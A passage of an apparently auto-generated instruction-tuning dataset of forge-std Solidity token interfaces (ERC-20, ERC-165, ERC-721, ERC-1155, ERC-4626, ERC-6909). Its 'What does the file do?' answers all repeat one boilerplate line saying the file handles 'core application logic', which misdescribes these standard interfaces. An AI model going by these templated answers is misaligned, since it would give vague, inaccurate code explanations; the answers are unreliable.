tokens\n    /// @return The _owner's balance of the token types requested (i.e. balance for each (owner, id) pair)\n    function balanceOfBatch(address[] calldata _owners, uint256[] calldata _ids)\n        external\n        view\n        returns (uint256[] memory);\n\n    /// @notice Enable or disable approval for a third party (\"operator\") to manage all of the caller's tokens.\n    /// @dev MUST emit the ApprovalForAll event on success.\n    /// @param _operator Address to add to the set of authorized operators\n    /// @param _approved True if the operator is approved, false to revoke approval\n    function setApprovalForAll(address _operator, bool _approved) external;\n\n    /// @notice Queries the approval status of an operator for a given owner.\n    /// @param _owner The owner of the tokens\n    /// @param _operator Address of authorized operator\n    /// @return True if the operator is approved, false if not\n    function isApprovedForAll(address _owner, address _operator) external view returns (bool);\n}\n\n```"}
{"instruction": "What does the file IERC1155.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC165} from \"./IERC165.sol\";\n\n/// @title ERC-1155 Multi Token Standard\n/// @dev See https://eips.ethereum.org/EIPS/eip-1155\n/// Note: The ERC-165 identifier for this interface is 0xd9b67a26.\ninterface IERC1155 is IERC165 {\n    /// @dev\n    /// - Either `TransferSingle` or `TransferBatch` MUST emit when tokens are transferred, including zero value transfers as well as minting or burning (see \"Safe Transfer Rules\" section of the standard).\n    /// - The `_operator` argument MUST be the address of an account/contract that is approved to make the transfer (SHOULD be msg.sender).\n    /// - The `_from` argument MUST be the address of the holder whose balance is decreased.\n    /// - The `_to` argument MUST be the address of the recipient whose balance is increased.\n    /// - The `_id` argument MUST be the token type being transferred.\n    /// - The `_value` argument MUST be the number of tokens the holder balance is decreased by and match what the recipient balance is increased by.\n    /// - When minting/creating tokens, the `_from` argument MUST be set to `0x0` (i.e. zero address).\n    /// - When burning/destroying tokens, the `_to` argument MUST be set to `0x0` (i.e. zero address).\n    event TransferSingle(\n        address indexed _operator, address indexed _from, address indexed _to, uint256 _id, uint256 _value\n    );\n\n    /// @dev\n    /// - Either `TransferSingle` or `TransferBatch` MUST emit when tokens are transferred, including zero value transfers as well as minting or burning (see \"Safe Transfer Rules\" section of the standard).\n    /// - The `_operator` argument MUST be the address of an account/contract that is approved to make the transfer (SHOULD be msg.sender).\n    /// - The `_from` argument MUST be the address of the holder whose balance is decreased.\n    /// - The `_to` argument MUST be the address of the recipient whose balance is increased.\n    /// - The `_ids` argume\n```", "output": "This file `IERC1155.sol` is part of the interfaces project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IERC165.sol which is part of the interfaces project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\interfaces\\IERC165.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\ninterface IERC165 {\n    /// @notice Query if a contract implements an interface\n    /// @param interfaceID The interface identifier, as specified in ERC-165\n    /// @dev Interface identification is specified in ERC-165. This function\n    /// uses less than 30,000 gas.\n    /// @return `true` if the contract implements `interfaceID` and\n    /// `interfaceID` is not 0xffffffff, `false` otherwise\n    function supportsInterface(bytes4 interfaceID) external view returns (bool);\n}\n\n```"}
{"instruction": "What does the file IERC165.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\ninterface IERC165 {\n    /// @notice Query if a contract implements an interface\n    /// @param interfaceID The interface identifier, as specified in ERC-165\n    /// @dev Interface identification is specified in ERC-165. This function\n    /// uses less than 30,000 gas.\n    /// @return `true` if the contract implements `interfaceID` and\n    /// `interfaceID` is not 0xffffffff, `false` otherwise\n    function supportsInterface(bytes4 interfaceID) external view returns (bool);\n}\n\n```", "output": "This file `IERC165.sol` is part of the interfaces project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IERC20.sol which is part of the interfaces project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\interfaces\\IERC20.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\n/// @dev Interface of the ERC20 standard as defined in the EIP.\n/// @dev This includes the optional name, symbol, and decimals metadata.\ninterface IERC20 {\n    /// @dev Emitted when `value` tokens are moved from one account (`from`) to another (`to`).\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @dev Emitted when the allowance of a `spender` for an `owner` is set, where `value`\n    /// is the new allowance.\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /// @notice Returns the amount of tokens in existence.\n    function totalSupply() external view returns (uint256);\n\n    /// @notice Returns the amount of tokens owned by `account`.\n    function balanceOf(address account) external view returns (uint256);\n\n    /// @notice Moves `amount` tokens from the caller's account to `to`.\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /// @notice Returns the remaining number of tokens that `spender` is allowed\n    /// to spend on behalf of `owner`\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /// @notice Sets `amount` as the allowance of `spender` over the caller's tokens.\n    /// @dev Be aware of front-running risks: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /// @notice Moves `amount` tokens from `from` to `to` using the allowance mechanism.\n    /// `amount` is then deducted from the caller's allowance.\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n\n    /// @notice Returns the name of the token.\n    function name() external view returns (string memory);\n\n    /// @notice Returns the symbol of the token.\n    function symbol() external view returns (string memory);\n\n    /// @notice Returns the decimals places of the token.\n    function decimals() external view returns (uint8);\n}\n\n```"}
{"instruction": "What does the file IERC20.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\n/// @dev Interface of the ERC20 standard as defined in the EIP.\n/// @dev This includes the optional name, symbol, and decimals metadata.\ninterface IERC20 {\n    /// @dev Emitted when `value` tokens are moved from one account (`from`) to another (`to`).\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @dev Emitted when the allowance of a `spender` for an `owner` is set, where `value`\n    /// is the new allowance.\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /// @notice Returns the amount of tokens in existence.\n    function totalSupply() external view returns (uint256);\n\n    /// @notice Returns the amount of tokens owned by `account`.\n    function balanceOf(address account) external view returns (uint256);\n\n    /// @notice Moves `amount` tokens from the caller's account to `to`.\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /// @notice Returns the remaining number of tokens that `spender` is allowed\n    /// to spend on behalf of `owner`\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /// @notice Sets `amount` as the allowance of `spender` over the caller's tokens.\n    /// @dev Be aware of front-running risks: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /// @notice Moves `amount` tokens from `from` to `to` using the allowance mechanism.\n    /// `amount` is then deducted from the caller's allowance.\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n\n    /// @notice Returns the name of the token.\n    function name() external view returns (string memory);\n\n    /// @notice Returns the symbol of the token.\n    function symbol() external view returns (string memory);\n\n    /// @notice Returns th\n```", "output": "This file `IERC20.sol` is part of the interfaces project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IERC4626.sol which is part of the interfaces project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\interfaces\\IERC4626.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC20} from \"./IERC20.sol\";\n\n/// @dev Interface of the ERC4626 \"Tokenized Vault Standard\", as defined in\n/// https://eips.ethereum.org/EIPS/eip-4626\ninterface IERC4626 is IERC20 {\n    event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares);\n\n    event Withdraw(\n        address indexed sender, address indexed receiver, address indexed owner, uint256 assets, uint256 shares\n    );\n\n    /// @notice Returns the address of the underlying token used for the Vault for accounting, depositing, and withdrawing.\n    /// @dev\n    /// - MUST be an ERC-20 token contract.\n    /// - MUST NOT revert.\n    function asset() external view returns (address assetTokenAddress);\n\n    /// @notice Returns the total amount of the underlying asset that is â€œmanagedâ€ by Vault.\n    /// @dev\n    /// - SHOULD include any compounding that occurs from yield.\n    /// - MUST be inclusive of any fees that are charged against assets in the Vault.\n    /// - MUST NOT revert.\n    function totalAssets() external view returns (uint256 totalManagedAssets);\n\n    /// @notice Returns the amount of shares that the Vault would exchange for the amount of assets provided, in an ideal\n    /// scenario where all the conditions are met.\n    /// @dev\n    /// - MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n    /// - MUST NOT show any variations depending on the caller.\n    /// - MUST NOT reflect slippage or other on-chain conditions, when performing the actual exchange.\n    /// - MUST NOT revert.\n    ///\n    /// NOTE: This calculation MAY NOT reflect the â€œper-userâ€ price-per-share, and instead should reflect the\n    /// â€œaverage-userâ€™sâ€ price-per-share, meaning what the average user should expect to see when exchanging to and\n    /// from.\n    function convertToShares(uint256 assets) external view returns (uint256 shares);\n\n    /// @notice Returns the amount of assets that the Vault would exchange for the amount of shares provided, in an ideal\n    /// scenario where all the conditions are met.\n    /// @dev\n    /// - MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n    /// - MUST NOT show any variations depending on the caller.\n    /// - MUST NOT reflect slippage or other on-chain conditions, when performing the actual exchange.\n    /// - MUST NOT revert.\n    ///\n    /// NOTE: This calculation MAY NOT reflect the â€œper-userâ€ price-per-share, and instead should reflect the\n    /// â€œaverage-userâ€™sâ€ price-per-share, meaning what the average user should expect to see when exchanging to and\n    /// from.\n    function convertToAssets(uint256 shares) external view returns (uint256 assets);\n\n    /// @notice Returns the maximum amount of the underlying asset that can be deposited into the Vault for the receiver,\n    /// through a deposit call.\n    /// @dev\n    /// - MUST return a limited value if receiver is subject to some deposit limit.\n    /// - MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited.\n    /// - MUST NOT revert.\n    function maxDeposit(address receiver) external view returns (uint256 maxAssets);\n\n    /// @notice Allows an on-chain or off-chain user to simulate the effects of their deposit at the current block, given\n    /// current on-chain conditions.\n    /// @dev\n    /// - MUST return as close to and no more than the exact amount of Vault shares that would be minted in a deposit\n    ///   call in the same transaction. I.e. deposit should return the same or more shares as previewDeposit if called\n    ///   in the same transaction.\n    /// - MUST NOT account for deposit limits like those returned from maxDeposit and should always act as though the\n    ///   deposit would be accepted, regardless if the user has enough tokens approved, etc.\n    /// - MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.\n    /// - MUST NOT revert.\n    ///\n    /// NOTE: any unfavorable discrepancy between convertToShares and previewDeposit SHOULD be considered slippage in\n    /// share price or some other type of condition, meaning the depositor will lose assets by depositing.\n    function previewDeposit(uint256 assets) external view returns (uint256 shares);\n\n    /// @notice Mints shares Vault shares to receiver by depositing exactly amount of underlying tokens.\n    /// @dev\n    /// - MUST emit the Deposit event.\n    /// - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the\n    ///   deposit execution, and are accounted for during deposit.\n    /// - MUST revert if all of assets cannot be deposited (due to deposit limit being reached, slippage, the user not\n    ///   approving enough underlying tokens to the Vault contract, etc).\n    ///\n    /// NOTE: most implementations will require pre-approval of the Vault with the Vaultâ€™s underlying asset token.\n    function deposit(uint256 assets, address receiver) external returns (uint256 shares);\n\n    /// @notice Returns the maximum amount of the Vault shares that can be minted for the receiver, through a mint call.\n    /// @dev\n    /// - MUST return a limited value if receiver is subject to some mint limit.\n    /// - MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of shares that may be minted.\n    /// - MUST NOT revert.\n    function maxMint(address receiver) external view returns (uint256 maxShares);\n\n    /// @notice Allows an on-chain or off-chain user to simulate the effects of their mint at the current block, given\n    /// current on-chain conditions.\n    /// @dev\n    /// - MUST return as close to and no fewer than the exact amount of assets that would be deposited in a mint call\n    ///   in the same transaction. I.e. mint should return the same or fewer assets as previewMint if called in the\n    ///   same transaction.\n    /// - MUST NOT account for mint limits like those returned from maxMint and should always act as though the mint\n    ///   would be accepted, regardless if the user has enough tokens approved, etc.\n    /// - MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.\n    /// - MUST NOT revert.\n    ///\n    /// NOTE: any unfavorable discrepancy between convertToAssets and previewMint SHOULD be considered slippage in\n    /// share price or some other type of condition, meaning the depositor will lose assets by minting.\n    function previewMint(uint256 shares) external view returns (uint256 assets);\n\n    /// @notice Mints exactly shares Vault shares to receiver by depositing amount of underlying tokens.\n    /// @dev\n    /// - MUST emit the Deposit event.\n    /// - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the mint\n    ///   execution, and are accounted for during mint.\n    /// - MUST revert if all of shares cannot be minted (due to deposit limit being reached, slippage, the user not\n    ///   approving enough underlying tokens to the Vault contract, etc).\n    ///\n    /// NOTE: most implementations will require pre-approval of the Vault with the Vaultâ€™s underlying asset token.\n    function mint(uint256 shares, address receiver) external returns (uint256 assets);\n\n    /// @notice Returns the maximum amount of the underlying asset that can be withdrawn from the owner balance in the\n    /// Vault, through a withdrawal call.\n    /// @dev\n    /// - MUST return a limited value if owner is subject to some withdrawal limit or timelock.\n    /// - MUST NOT revert.\n    function maxWithdraw(address owner) external view returns (uint256 maxAssets);\n\n    /// @notice Allows an on-chain or off-chain user to simulate the effects of their withdrawal at the current block,\n    /// given current on-chain conditions.\n    /// @dev\n    /// - MUST return as close to and no fewer than the exact amount of Vault shares that would be burned in a withdraw\n    ///   call in the same transaction. I.e. withdraw should return the same or fewer shares as previewWithdraw if\n    ///   called\n    ///   in the same transaction.\n    /// - MUST NOT account for withdrawal limits like those returned from maxWithdraw and should always act as though\n    ///   the withdrawal would be accepted, regardless if the user has enough shares, etc.\n    /// - MUST be inclusive of withdrawal fees. Integrators should be aware of the existence of withdrawal fees.\n    /// - MUST NOT revert.\n    ///\n    /// NOTE: any unfavorable discrepancy between convertToShares and previewWithdraw SHOULD be considered slippage in\n    /// share price or some other type of condition, meaning the depositor will lose assets by depositing.\n    function previewWithdraw(uint256 assets) external view returns (uint256 shares);\n\n    /// @notice Burns shares from owner and sends exactly assets of underlying tokens to receiver.\n    /// @dev\n    /// - MUST emit the Withdraw event.\n    /// - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the\n    ///   withdraw execution, and are accounted for during withdrawal.\n    /// - MUST revert if all of assets cannot be withdrawn (due to withdrawal limit being reached, slippage, the owner\n    ///   not having enough shares, etc).\n    ///\n    /// Note that some implementations will require pre-requesting to the Vault before a withdrawal may be performed.\n    /// Those methods should be performed separately.\n    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);\n\n    /// @notice Returns the maximum amount of Vault shares that can be redeemed from the owner balance in the Vault,\n    /// through a redeem call.\n    /// @dev\n    /// - MUST return a limited value if owner is subject to some withdrawal limit or timelock.\n    /// - MUST return balanceOf(owner) if owner is not subject to any withdrawal limit or timelock.\n    /// - MUST NOT revert.\n    function maxRedeem(address owner) external view returns (uint256 maxShares);\n\n    /// @notice Allows an on-chain or off-chain user to simulate the effects of their redeemption at the current block,\n    /// given current on-chain conditions.\n    /// @dev\n    /// - MUST return as close to and no more than the exact amount of assets that would be withdrawn in a redeem call\n    ///   in the same transaction. I.e. redeem should return the same or more assets as previewRedeem if called in the\n    ///   same transaction.\n    /// - MUST NOT account for redemption limits like those returned from maxRedeem and should always act as though the\n    ///   redemption would be accepted, regardless if the user has enough shares, etc.\n    /// - MUST be inclusive of withdrawal fees. Integrators should be aware of the existence of withdrawal fees.\n    /// - MUST NOT revert.\n    ///\n    /// NOTE: any unfavorable discrepancy between convertToAssets and previewRedeem SHOULD be considered slippage in\n    /// share price or some other type of condition, meaning the depositor will lose assets by redeeming.\n    function previewRedeem(uint256 shares) external view returns (uint256 assets);\n\n    /// @notice Burns exactly shares from owner and sends assets of underlying tokens to receiver.\n    /// @dev\n    /// - MUST emit the Withdraw event.\n    /// - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the\n    ///   redeem execution, and are accounted for during redeem.\n    /// - MUST revert if all of shares cannot be redeemed (due to withdrawal limit being reached, slippage, the owner\n    ///   not having enough shares, etc).\n    ///\n    /// NOTE: some implementations will require pre-requesting to the Vault before a withdrawal may be performed.\n    /// Those methods should be performed separately.\n    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);\n}\n\n```"}
{"instruction": "What does the file IERC4626.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC20} from \"./IERC20.sol\";\n\n/// @dev Interface of the ERC4626 \"Tokenized Vault Standard\", as defined in\n/// https://eips.ethereum.org/EIPS/eip-4626\ninterface IERC4626 is IERC20 {\n    event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares);\n\n    event Withdraw(\n        address indexed sender, address indexed receiver, address indexed owner, uint256 assets, uint256 shares\n    );\n\n    /// @notice Returns the address of the underlying token used for the Vault for accounting, depositing, and withdrawing.\n    /// @dev\n    /// - MUST be an ERC-20 token contract.\n    /// - MUST NOT revert.\n    function asset() external view returns (address assetTokenAddress);\n\n    /// @notice Returns the total amount of the underlying asset that is â€œmanagedâ€ by Vault.\n    /// @dev\n    /// - SHOULD include any compounding that occurs from yield.\n    /// - MUST be inclusive of any fees that are charged against assets in the Vault.\n    /// - MUST NOT revert.\n    function totalAssets() external view returns (uint256 totalManagedAssets);\n\n    /// @notice Returns the amount of shares that the Vault would exchange for the amount of assets provided, in an ideal\n    /// scenario where all the conditions are met.\n    /// @dev\n    /// - MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n    /// - MUST NOT show any variations depending on the caller.\n    /// - MUST NOT reflect slippage or other on-chain conditions, when performing the actual exchange.\n    /// - MUST NOT revert.\n    ///\n    /// NOTE: This calculation MAY NOT reflect the â€œper-userâ€ price-per-share, and instead should reflect the\n    /// â€œaverage-userâ€™sâ€ price-per-share, meaning what the average user should expect to see when exchanging to and\n    /// from.\n    function convertToShares(uint256 assets) external view returns (uint256 shares);\n\n    /// @notice Returns the amount of asset\n```", "output": "This file `IERC4626.sol` is part of the interfaces project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IERC6909.sol which is part of the interfaces project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\interfaces\\IERC6909.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC165} from \"./IERC165.sol\";\n\n/// @dev Required interface of an ERC-6909 compliant contract, as defined in\n/// https://eips.ethereum.org/EIPS/eip-6909\ninterface IERC6909 is IERC165 {\n    /// @dev Emitted when the allowance of a `spender` for an `owner` is set for a token of type `id`.\n    event Approval(address indexed owner, address indexed spender, uint256 indexed id, uint256 amount);\n\n    /// @dev Emitted when `owner` grants or revokes operator status for a `spender`.\n    event OperatorSet(address indexed owner, address indexed spender, bool approved);\n\n    /// @dev Emitted when `amount` tokens of type `id` are moved from `sender` to `receiver` initiated by `caller`.\n    event Transfer(\n        address caller, address indexed sender, address indexed receiver, uint256 indexed id, uint256 amount\n    );\n\n    ///@dev Returns the amount of tokens of type `id` owned by `owner`.\n    function balanceOf(address owner, uint256 id) external view returns (uint256);\n\n    /// @dev Returns the amount of tokens of type `id` that `spender` is allowed to spend on behalf of `owner`.\n    /// NOTE: Does not include operator allowances.\n    function allowance(address owner, address spender, uint256 id) external view returns (uint256);\n\n    /// @dev Returns true if `spender` is set as an operator for `owner`.\n    function isOperator(address owner, address spender) external view returns (bool);\n\n    /// @dev Sets an approval to `spender` for `amount` tokens of type `id` from the caller's tokens.\n    /// Must return true.\n    function approve(address spender, uint256 id, uint256 amount) external returns (bool);\n\n    /// @dev Grants or revokes unlimited transfer permission of any token id to `spender` for the caller's tokens.\n    /// Must return true.\n    function setOperator(address spender, bool approved) external returns (bool);\n\n    /// @dev Transfers `amount` of token type `id` from the caller's account to `receiver`.\n    /// Must return true.\n    function transfer(address receiver, uint256 id, uint256 amount) external returns (bool);\n\n    /// @dev Transfers `amount` of token type `id` from `sender` to `receiver`.\n    /// Must return true.\n    function transferFrom(address sender, address receiver, uint256 id, uint256 amount) external returns (bool);\n}\n\n/// @dev Optional extension of {IERC6909} that adds metadata functions.\ninterface IERC6909Metadata is IERC6909 {\n    /// @dev Returns the name of the token of type `id`.\n    function name(uint256 id) external view returns (string memory);\n\n    /// @dev Returns the ticker symbol of the token of type `id`.\n    function symbol(uint256 id) external view returns (string memory);\n\n    /// @dev Returns the number of decimals for the token of type `id`.\n    function decimals(uint256 id) external view returns (uint8);\n}\n\n/// @dev Optional extension of {IERC6909} that adds content URI functions.\ninterface IERC6909ContentURI is IERC6909 {\n    /// @dev Returns URI for the contract.\n    function contractURI() external view returns (string memory);\n\n    /// @dev Returns the URI for the token of type `id`.\n    function tokenURI(uint256 id) external view returns (string memory);\n}\n\n/// @dev Optional extension of {IERC6909} that adds a token supply function.\ninterface IERC6909TokenSupply is IERC6909 {\n    /// @dev Returns the total supply of the token of type `id`.\n    function totalSupply(uint256 id) external view returns (uint256);\n}\n\n```"}
{"instruction": "What does the file IERC6909.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC165} from \"./IERC165.sol\";\n\n/// @dev Required interface of an ERC-6909 compliant contract, as defined in\n/// https://eips.ethereum.org/EIPS/eip-6909\ninterface IERC6909 is IERC165 {\n    /// @dev Emitted when the allowance of a `spender` for an `owner` is set for a token of type `id`.\n    event Approval(address indexed owner, address indexed spender, uint256 indexed id, uint256 amount);\n\n    /// @dev Emitted when `owner` grants or revokes operator status for a `spender`.\n    event OperatorSet(address indexed owner, address indexed spender, bool approved);\n\n    /// @dev Emitted when `amount` tokens of type `id` are moved from `sender` to `receiver` initiated by `caller`.\n    event Transfer(\n        address caller, address indexed sender, address indexed receiver, uint256 indexed id, uint256 amount\n    );\n\n    ///@dev Returns the amount of tokens of type `id` owned by `owner`.\n    function balanceOf(address owner, uint256 id) external view returns (uint256);\n\n    /// @dev Returns the amount of tokens of type `id` that `spender` is allowed to spend on behalf of `owner`.\n    /// NOTE: Does not include operator allowances.\n    function allowance(address owner, address spender, uint256 id) external view returns (uint256);\n\n    /// @dev Returns true if `spender` is set as an operator for `owner`.\n    function isOperator(address owner, address spender) external view returns (bool);\n\n    /// @dev Sets an approval to `spender` for `amount` tokens of type `id` from the caller's tokens.\n    /// Must return true.\n    function approve(address spender, uint256 id, uint256 amount) external returns (bool);\n\n    /// @dev Grants or revokes unlimited transfer permission of any token id to `spender` for the caller's tokens.\n    /// Must return true.\n    function setOperator(address spender, bool approved) external returns (bool);\n\n    /// @dev Transfers `amount` of token type `id` from the caller's\n```", "output": "This file `IERC6909.sol` is part of the interfaces project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IERC721.sol which is part of the interfaces project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\interfaces\\IERC721.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC165} from \"./IERC165.sol\";\n\n/// @title ERC-721 Non-Fungible Token Standard\n/// @dev See https://eips.ethereum.org/EIPS/eip-721\n/// Note: the ERC-165 identifier for this interface is 0x80ac58cd.\ninterface IERC721 is IERC165 {\n    /// @dev This emits when ownership of any NFT changes by any mechanism.\n    /// This event emits when NFTs are created (`from` == 0) and destroyed\n    /// (`to` == 0). Exception: during contract creation, any number of NFTs\n    /// may be created and assigned without emitting Transfer. At the time of\n    /// any transfer, the approved address for that NFT (if any) is reset to none.\n    event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);\n\n    /// @dev This emits when the approved address for an NFT is changed or\n    /// reaffirmed. The zero address indicates there is no approved address.\n    /// When a Transfer event emits, this also indicates that the approved\n    /// address for that NFT (if any) is reset to none.\n    event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId);\n\n    /// @dev This emits when an operator is enabled or disabled for an owner.\n    /// The operator can manage all NFTs of the owner.\n    event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);\n\n    /// @notice Count all NFTs assigned to an owner\n    /// @dev NFTs assigned to the zero address are considered invalid, and this\n    /// function throws for queries about the zero address.\n    /// @param _owner An address for whom to query the balance\n    /// @return The number of NFTs owned by `_owner`, possibly zero\n    function balanceOf(address _owner) external view returns (uint256);\n\n    /// @notice Find the owner of an NFT\n    /// @dev NFTs assigned to zero address are considered invalid, and queries\n    /// about them do throw.\n    /// @param _tokenId The identifier for an NFT\n    /// @return The address of the owner of the NFT\n    function ownerOf(uint256 _tokenId) external view returns (address);\n\n    /// @notice Transfers the ownership of an NFT from one address to another address\n    /// @dev Throws unless `msg.sender` is the current owner, an authorized\n    /// operator, or the approved address for this NFT. Throws if `_from` is\n    /// not the current owner. Throws if `_to` is the zero address. Throws if\n    /// `_tokenId` is not a valid NFT. When transfer is complete, this function\n    /// checks if `_to` is a smart contract (code size > 0). If so, it calls\n    /// `onERC721Received` on `_to` and throws if the return value is not\n    /// `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`.\n    /// @param _from The current owner of the NFT\n    /// @param _to The new owner\n    /// @param _tokenId The NFT to transfer\n    /// @param data Additional data with no specified format, sent in call to `_to`\n    function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes calldata data) external payable;\n\n    /// @notice Transfers the ownership of an NFT from one address to another address\n    /// @dev This works identically to the other function with an extra data parameter,\n    /// except this function just sets data to \"\".\n    /// @param _from The current owner of the NFT\n    /// @param _to The new owner\n    /// @param _tokenId The NFT to transfer\n    function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;\n\n    /// @notice Transfer ownership of an NFT -- THE CALLER IS RESPONSIBLE\n    /// TO CONFIRM THAT `_to` IS CAPABLE OF RECEIVING NFTS OR ELSE\n    /// THEY MAY BE PERMANENTLY LOST\n    /// @dev Throws unless `msg.sender` is the current owner, an authorized\n    /// operator, or the approved address for this NFT. Throws if `_from` is\n    /// not the current owner. Throws if `_to` is the zero address. Throws if\n    /// `_tokenId` is not a valid NFT.\n    /// @param _from The current owner of the NFT\n    /// @param _to The new owner\n    /// @param _tokenId The NFT to transfer\n    function transferFrom(address _from, address _to, uint256 _tokenId) external payable;\n\n    /// @notice Change or reaffirm the approved address for an NFT\n    /// @dev The zero address indicates there is no approved address.\n    /// Throws unless `msg.sender` is the current NFT owner, or an authorized\n    /// operator of the current owner.\n    /// @param _approved The new approved NFT controller\n    /// @param _tokenId The NFT to approve\n    function approve(address _approved, uint256 _tokenId) external payable;\n\n    /// @notice Enable or disable approval for a third party (\"operator\") to manage\n    /// all of `msg.sender`'s assets\n    /// @dev Emits the ApprovalForAll event. The contract MUST allow\n    /// multiple operators per owner.\n    /// @param _operator Address to add to the set of authorized operators\n    /// @param _approved True if the operator is approved, false to revoke approval\n    function setApprovalForAll(address _operator, bool _approved) external;\n\n    /// @notice Get the approved address for a single NFT\n    /// @dev Throws if `_tokenId` is not a valid NFT.\n    /// @param _tokenId The NFT to find the approved address for\n    /// @return The approved address for this NFT, or the zero address if there is none\n    function getApproved(uint256 _tokenId) external view returns (address);\n\n    /// @notice Query if an address is an authorized operator for another address\n    /// @param _owner The address that owns the NFTs\n    /// @param _operator The address that acts on behalf of the owner\n    /// @return True if `_operator` is an approved operator for `_owner`, false otherwise\n    function isApprovedForAll(address _owner, address _operator) external view returns (bool);\n}\n\n/// @dev Note: the ERC-165 identifier for this interface is 0x150b7a02.\ninterface IERC721TokenReceiver {\n    /// @notice Handle the receipt of an NFT\n    /// @dev The ERC721 smart contract calls this function on the recipient\n    /// after a `transfer`. This function MAY throw to revert and reject the\n    /// transfer. Return of other than the magic value MUST result in the\n    /// transaction being reverted.\n    /// Note: the contract address is always the message sender.\n    /// @param _operator The address which called `safeTransferFrom` function\n    /// @param _from The address which previously owned the token\n    /// @param _tokenId The NFT identifier which is being transferred\n    /// @param _data Additional data with no specified format\n    /// @return `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\n    ///  unless throwing\n    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data)\n        external\n        returns (bytes4);\n}\n\n/// @title ERC-721 Non-Fungible Token Standard, optional metadata extension\n/// @dev See https://eips.ethereum.org/EIPS/eip-721\n/// Note: the ERC-165 identifier for this interface is 0x5b5e139f.\ninterface IERC721Metadata is IERC721 {\n    /// @notice A descriptive name for a collection of NFTs in this contract\n    function name() external view returns (string memory _name);\n\n    /// @notice An abbreviated name for NFTs in this contract\n    function symbol() external view returns (string memory _symbol);\n\n    /// @notice A distinct Uniform Resource Identifier (URI) for a given asset.\n    /// @dev Throws if `_tokenId` is not a valid NFT. URIs are defined in RFC\n    /// 3986. The URI may point to a JSON file that conforms to the \"ERC721\n    /// Metadata JSON Schema\".\n    function tokenURI(uint256 _tokenId) external view returns (string memory);\n}\n\n/// @title ERC-721 Non-Fungible Token Standard, optional enumeration extension\n/// @dev See https://eips.ethereum.org/EIPS/eip-721\n/// Note: the ERC-165 identifier for this interface is 0x780e9d63.\ninterface IERC721Enumerable is IERC721 {\n    /// @notice Count NFTs tracked by this contract\n    /// @return A count of valid NFTs tracked by this contract, where each one of\n    /// them has an assigned and queryable owner not equal to the zero address\n    function totalSupply() external view returns (uint256);\n\n    /// @notice Enumerate valid NFTs\n    /// @dev Throws if `_index` >= `totalSupply()`.\n    /// @param _index A counter less than `totalSupply()`\n    /// @return The token identifier for the `_index`th 